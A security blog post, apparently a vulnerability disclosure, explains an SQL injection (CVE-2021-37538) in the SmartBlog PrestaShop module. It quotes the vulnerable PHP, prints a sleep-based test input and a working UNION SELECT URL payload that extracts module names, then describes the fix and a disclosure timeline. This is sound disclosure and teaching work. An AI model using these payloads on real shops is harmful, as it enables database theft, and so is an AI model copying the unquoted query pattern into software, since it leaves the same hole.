<!DOCTYPE html>


<html lang="en-us" data-theme="">
<head>
    
        
<meta charset="utf-8">
<meta name="HandheldFriendly" content="True">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer-when-downgrade">

<title>SQLi in SmartBlog CVE-2021-37538 - Sorcery Blog</title>
<meta name="description" content="">

<link rel="icon" type="image/x-icon" href="favicon.ico">
<link rel="apple-touch-icon-precomposed" href="favicon.png">





<link rel="stylesheet" href="/css/style.bb96fd315dd35ff3162f4a19fe9ef9d1259274e37555145edc78e9fe914db7aa.css" integrity="sha256-u5b9MV3TX/MWL0oZ/p750SWSdON1VRRe3Hjp/pFNt6o=">

<link rel="stylesheet" href="css/my.css?rnd=1633364048">

<script src="js/main.js?rnd=1633364048" type="text/javascript" charset="utf-8"></script>

<meta property="og:title" content="SQLi in SmartBlog CVE-2021-37538" />
<meta property="og:description" content="This blog post details an SQLi I found in the SmartBlog Prestashop module by SmartDataSoft.
First we need to talk about how the Prestashop pSQL function works and what it does.
pSQL() is intended for string escaping, so for example if you have a query like:
$sql = &#34;SELECT * FROM myTable WHERE name=&#39;$name&#39;&#34;  If $name has quotes in it then it can break out of the quotes. If $name is james&#39; and sleep(10)-- -" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/smartblog_sqli/" />
<meta property="og:image" content="images/og-featured.png"/>
<meta property="article:published_time" content="2021-08-21T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-08-21T00:00:00+00:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="images/og-featured.png"/>

<meta name="twitter:title" content="SQLi in SmartBlog CVE-2021-37538"/>
<meta name="twitter:description" content="This blog post details an SQLi I found in the SmartBlog Prestashop module by SmartDataSoft.
First we need to talk about how the Prestashop pSQL function works and what it does.
pSQL() is intended for string escaping, so for example if you have a query like:
$sql = &#34;SELECT * FROM myTable WHERE name=&#39;$name&#39;&#34;  If $name has quotes in it then it can break out of the quotes. If $name is james&#39; and sleep(10)-- -"/>









    
</head>
<body>
    <a class="skip-main" href="#main">Skip to main content</a>
    <div class="container">
        <header class="common-header"> 
            
                <h1 class="site-title">
    <a href="/">Sorcery Blog</a>
</h1>

    <nav>
        
        
        <a class="" href="https://twitter.com/sorceryie" title="Twitter">Twitter</a>
        
        <a class="" href="/posts/" title="Archive">Archive</a>
        
        <a class="" href="/tags/" title="">Tags</a>
        
        <a class="" href="https://sorcery.ie" title="Main Site">Main Site</a>
        
    </nav>


            
        </header>
        <main id="main" tabindex="-1"> 
            
    
    
    <article class="post">
        <header class="post-header">
            <h1 class="post-title">SQLi in SmartBlog CVE-2021-37538</h1>
        </header>
        <div class="content">
            <p>This blog post details an SQLi I found in the SmartBlog Prestashop module by <a href="https://smartdatasoft.com/">SmartDataSoft</a>.</p>
<p>First we need to talk about how the Prestashop pSQL function works and what it does.<br>
pSQL() is intended for string escaping, so for example if you have a query like:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * FROM myTable WHERE name=&#39;</span><span style="color:#e6db74">$name</span><span style="color:#e6db74">&#39;&#34;</span>  
</code></pre></div>
<p>If $name has quotes in it then it can break out of the quotes. If $name is <code>james' and sleep(10)-- -</code></p>
<p>then the query would be:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> myTable <span style="color:#66d9ef">WHERE</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;james&#39;</span> <span style="color:#66d9ef">and</span> sleep(<span style="color:#ae81ff">10</span>)<span style="color:#75715e">-- -&#39;</span></code></pre></div>
<p>If our example was sanitised by pSQL it would be something like:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> myTable <span style="color:#66d9ef">WHERE</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;james\&#39;</span> <span style="color:#66d9ef">and</span> sleep(<span style="color:#ae81ff">10</span>)<span style="color:#75715e">-- -&#39;</span></code></pre></div>
<p>All pSQL() does is escape quotes essentially.</p>
<p>In this module we discovered two SQLis, I will only discuss the archive SQLi in depth as the category SQLi is the same idea but requires a certain setting enabled.</p>
<p>In <code>controllers/front/archive.php</code> we can see that the <code>day</code>, <code>month</code> and <code>year</code> parameters are passed to the getArchiveResult() function without sanitisation.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">initContent</span>()  
{  
    <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">initContent</span>();  
    $blogcomment <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Blogcomment</span>();  
    $day <span style="color:#f92672">=</span> <span style="color:#a6e22e">Tools</span><span style="color:#f92672">::</span><span style="color:#a6e22e">getvalue</span>(<span style="color:#e6db74">&#39;day&#39;</span>);  
    $year <span style="color:#f92672">=</span> <span style="color:#a6e22e">Tools</span><span style="color:#f92672">::</span><span style="color:#a6e22e">getvalue</span>(<span style="color:#e6db74">&#39;year&#39;</span>);  
    $month <span style="color:#f92672">=</span> <span style="color:#a6e22e">Tools</span><span style="color:#f92672">::</span><span style="color:#a6e22e">getvalue</span>(<span style="color:#e6db74">&#39;month&#39;</span>);  
    $title_category <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;  
    $posts_per_page <span style="color:#f92672">=</span> <span style="color:#a6e22e">Configuration</span><span style="color:#f92672">::</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;smartpostperpage&#39;</span>);  
    $limit_start <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;  
    $limit <span style="color:#f92672">=</span> $posts_per_page;  
    <span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">boolean</span>) <span style="color:#a6e22e">Tools</span><span style="color:#f92672">::</span><span style="color:#a6e22e">getValue</span>(<span style="color:#e6db74">&#39;page&#39;</span>)) {  
        $c <span style="color:#f92672">=</span> (<span style="color:#a6e22e">int</span>) <span style="color:#a6e22e">Tools</span><span style="color:#f92672">::</span><span style="color:#a6e22e">getValue</span>(<span style="color:#e6db74">&#39;page&#39;</span>);  
        $limit_start <span style="color:#f92672">=</span> $posts_per_page <span style="color:#f92672">*</span> ($c <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);  
    }  
    $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">SmartBlogPost</span><span style="color:#f92672">::</span><span style="color:#a6e22e">getArchiveResult</span>($month, $year, $day, $limit_start, $limit);
</code></pre></div>
<p>If we look at the getArchiveResult function in <code>classes/SmartBlogPost.php</code> we can see they are being used in an SQL query:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getArchiveResult</span>($month <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>, $year <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>, $day <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>, $limit_start <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, $limit <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>){  
    $BlogCategory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;  
    $day <span style="color:#f92672">=</span> <span style="color:#a6e22e">pSQL</span>($day);  
    $month <span style="color:#f92672">=</span> <span style="color:#a6e22e">pSQL</span>($month);  
    $year <span style="color:#f92672">=</span> <span style="color:#a6e22e">pSQL</span>($year);  
    $result <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();  
    $id_lang <span style="color:#f92672">=</span> (<span style="color:#a6e22e">int</span>) <span style="color:#a6e22e">Context</span><span style="color:#f92672">::</span><span style="color:#a6e22e">getContext</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">language</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">id</span>;  
    <span style="color:#66d9ef">if</span> ($month <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">and</span> $month <span style="color:#f92672">!=</span> <span style="color:#66d9ef">NULL</span> <span style="color:#66d9ef">and</span> $year <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">and</span> $year <span style="color:#f92672">!=</span> <span style="color:#66d9ef">NULL</span> <span style="color:#66d9ef">and</span> $day <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">and</span> $day <span style="color:#f92672">!=</span> <span style="color:#66d9ef">NULL</span>) {  
        $sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;SELECT * FROM &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">_DB_PREFIX_</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;smart_blog_post s INNER JOIN &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">_DB_PREFIX_</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;smart_blog_post_lang sl ON s.id_smart_blog_post = sl.id_smart_blog_post and sl.id_lang = &#39;</span> <span style="color:#f92672">.</span> $id_lang <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39; INNER JOIN &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">_DB_PREFIX_</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;smart_blog_post_shop ps ON ps.id_smart_blog_post = s.id_smart_blog_post AND ps.id_shop = &#39;</span> <span style="color:#f92672">.</span> (<span style="color:#a6e22e">int</span>) <span style="color:#a6e22e">Context</span><span style="color:#f92672">::</span><span style="color:#a6e22e">getContext</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">shop</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">id</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39; where s.active = 1 and DAY(s.created) = &#39;</span> <span style="color:#f92672">.</span> $day <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39; and MONTH(s.created) = &#39;</span> <span style="color:#f92672">.</span> $month <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39; AND YEAR(s.created) = &#39;</span> <span style="color:#f92672">.</span> $year <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39; ORDER BY s.id_smart_blog_post DESC&#39;</span>;  
    }
    <span style="color:#75715e">// skipping a bunch of similar elseif cases
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$posts <span style="color:#f92672">=</span> <span style="color:#a6e22e">Db</span><span style="color:#f92672">::</span><span style="color:#a6e22e">getInstance</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">executeS</span>($sql))  
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</code></pre></div>
<p>As we can see the day, month and year values are not surrounded by quotes in the query so the fact that pSQL sanitises these characters is no issue for us as we are already in the query.</p>
<p>In order to test this I installed the plugin locally and used <code>1 and sleep(10)-- -</code> as an input and modified the source to print out the query and this is what we see:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> ps_smart_blog_post s <span style="color:#66d9ef">INNER</span> <span style="color:#66d9ef">JOIN</span> ps_smart_blog_post_lang sl <span style="color:#66d9ef">ON</span>
s.id_smart_blog_post <span style="color:#f92672">=</span> sl.id_smart_blog_post <span style="color:#66d9ef">and</span> sl.id_lang <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">INNER</span> <span style="color:#66d9ef">JOIN</span>
ps_smart_blog_post_shop ps <span style="color:#66d9ef">ON</span> ps.id_smart_blog_post <span style="color:#f92672">=</span> s.id_smart_blog_post
<span style="color:#66d9ef">AND</span> ps.id_shop <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">where</span> s.active <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">DAY</span>(s.created) <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> sleep(<span style="color:#ae81ff">10</span>)<span style="color:#75715e">-- - and MONTH(s.created) = 1 AND YEAR(s.created) = 1 ORDER BY s.id_smart_blog_post
</span><span style="color:#75715e"></span><span style="color:#66d9ef">DESC</span></code></pre></div>
<p>The SQLi was also confirmed by the page loading time being delayed by 10 seconds.</p>
<p>For demonstration purposes here is a payload that will print out a list of the module names from the database:</p>
<pre><code>https://site.com/module/smartblog/archive?month=1&amp;year=1&amp;day=1
UNION ALL SELECT
NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,
(SELECT group_concat(name) FROM
ps_module),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
</code></pre><p>When the page is loaded the list of module names will be in the title of the last post.
(There is a character length limit for group_contact but you can get all the modules in two requests by flipping how the rows are ordered on the second request).</p>
<h1 id="fixing-the-issue">Fixing the issue</h1>
<p>In most of the cases the values being sanitised were numbers therefore casting them to integers was more appropriate than using pSQL. In cases where pSQL was used the values were surrounded with quotes in the query.</p>
<p>As mentioned in the previous post however if you are developing a Prestashop module it is strongly reccomended to utilise PDO for your SQL queries as described in Prestashop’s <a href="https://doc.prestashop.com/pages/viewpage.action?pageId=51184692">Best Practices for the DB Class</a>.</p>
<p>I contacted SmartDataSoft and they were quick to fix the issue with <a href="https://github.com/smartdatasoft/smartblog/commit/dcec2f77d98841ec478ca678ee501606224961b4">this commit</a>.</p>
<h1 id="timeline">Timeline</h1>
<table>
<thead>
<tr>
<th>Date</th>
<th>Action</th>
</tr>
</thead>
<tbody>
<tr>
<td>22/06/2021</td>
<td>Issue discovered during a pentest</td>
</tr>
<tr>
<td>13/07/2021</td>
<td>Reported issue to SmartDataSoft</td>
</tr>
<tr>
<td>15/07/2021</td>
<td>SmartDataSoft patched the issue in version 4.06</td>
</tr>
<tr>
<td>26/07/2021</td>
<td>Number <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37538">CVE-2021-37538</a> assigned</td>
</tr>
<tr>
<td>21/08/2021</td>
<td>Blog post released</td>
</tr>
<tr>
<td>24/08/2021</td>
<td><a href="https://github.com/pajoda">pajoda</a> made a <a href="https://github.com/projectdiscovery/nuclei-templates/pull/2475">Nuclei template</a> for this CVE</td>
</tr>
</tbody>
</table>

        </div>
        

    


<div class="post-info">
    
        <div class="post-date">2021-08-21</div>
    
    <div class="post-taxonomies">
        
            
                <ul class="post-tags">
                    
                        <li><a href="tags/smartblog">#smartblog</a></li>
                    
                        <li><a href="tags/prestashop">#prestashop</a></li>
                    
                        <li><a href="tags/cve-2021-37538">#CVE-2021-37538</a></li>
                    
                </ul>
        
    </div>
</div>

    </article>

    
        
    <div class="pagination post-pagination">
        <div class="left pagination-item ">
            
                <a href="/posts/redux_wordpress/">Proof of Concept for CVE-2021-38314 (Redux Framework)</a>
            
        </div>
        <div class="right pagination-item ">
            
                <a href="/posts/ph_simpleblog_sqli/">SQLi in ph_simpleblog CVE-2021-36748</a>
            
        </div>
    </div>

    

    


        </main>
        
            <footer class="common-footer">
    
    

    <div class="common-footer-bottom">
        
        <div class="copyright">
            <p>© Sorcery Ltd, 2021<br>
            Powered by <a target="_blank" rel="noopener noreferrer" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" rel="noopener noreferrer" href="https://github.com/mitrichius/hugo-theme-anubis">Anubis</a>.
            </p>  
        </div> 

        

    



    <button class="theme-switcher">
        Dark theme
    </button>

    <script>
    const STORAGE_KEY = 'user-color-scheme'
    const defaultTheme = "light"

    let currentTheme
    let switchButton
    let autoDefinedScheme = window.matchMedia('(prefers-color-scheme: dark)')

    const autoChangeScheme = e => {
        currentTheme = e.matches ? 'dark' : 'light'
        document.documentElement.setAttribute('data-theme', currentTheme)
        changeButtonText()
    }

    document.addEventListener('DOMContentLoaded', function() {
        switchButton = document.querySelector('.theme-switcher')
        currentTheme = detectCurrentScheme()
        if (currentTheme == 'dark') {
            document.documentElement.setAttribute('data-theme', 'dark')
        }
        if (currentTheme == 'auto') {
            autoChangeScheme(autoDefinedScheme);
            autoDefinedScheme.addListener(autoChangeScheme);
        }
        changeButtonText()
        switchButton.addEventListener('click', switchTheme, false)
    })

    function detectCurrentScheme() {
        if (localStorage.getItem(STORAGE_KEY)) {
            return localStorage.getItem(STORAGE_KEY)
        } 
        if (defaultTheme) {
            return defaultTheme
        } 
        if (!window.matchMedia) {
            return 'light'
        } 
        if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
            return 'dark'
        }
        return 'light'
    }

    function changeButtonText()
    {   
        switchButton.textContent = currentTheme == 'dark' ?  "Light theme" : "Dark theme"
    }

    function switchTheme(e) {
        if (currentTheme == 'dark') {
            localStorage.setItem(STORAGE_KEY, 'light')
            document.documentElement.setAttribute('data-theme', 'light')
            currentTheme = 'light'
        } else {
            localStorage.setItem(STORAGE_KEY, 'dark')
            document.documentElement.setAttribute('data-theme', 'dark')
            currentTheme = 'dark'
        }
        changeButtonText()
    }
    </script>
   
    </div>
</footer>

        
    </div>
</body>
</html>
